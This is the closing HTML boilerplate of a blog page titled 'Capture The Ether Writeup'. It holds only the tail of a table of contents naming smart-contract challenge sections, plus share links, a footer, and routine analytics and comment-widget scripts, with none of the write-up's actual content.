toc-level-2"><a class="toc-link" href="#Account"><span class="toc-number">5.</span> <span class="toc-text">Account</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Fuzzy-identity"><span class="toc-number">5.1.</span> <span class="toc-text">1. Fuzzy identity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Public-Key"><span class="toc-number">5.2.</span> <span class="toc-text">2. Public Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Account-Takeover"><span class="toc-number">5.3.</span> <span class="toc-text">3. Account Takeover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">6.</span> <span class="toc-text">Miscellaneous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Assume-ownership"><span class="toc-number">6.1.</span> <span class="toc-text">1. Assume ownership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Token-bank"><span class="toc-number">6.2.</span> <span class="toc-text">2. Token bank</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Capture-The-Ether-writeup.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Capture-The-Ether-writeup.html&text=Capture The Ether Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Capture-The-Ether-writeup.html&is_video=false&description=Capture The Ether Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture The Ether Writeup&body=Check out this article: https://bestwing.me/Capture-The-Ether-writeup.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Capture-The-Ether-writeup.html&name=Capture The Ether Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Capture-The-Ether-writeup.html&t=Capture The Ether Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
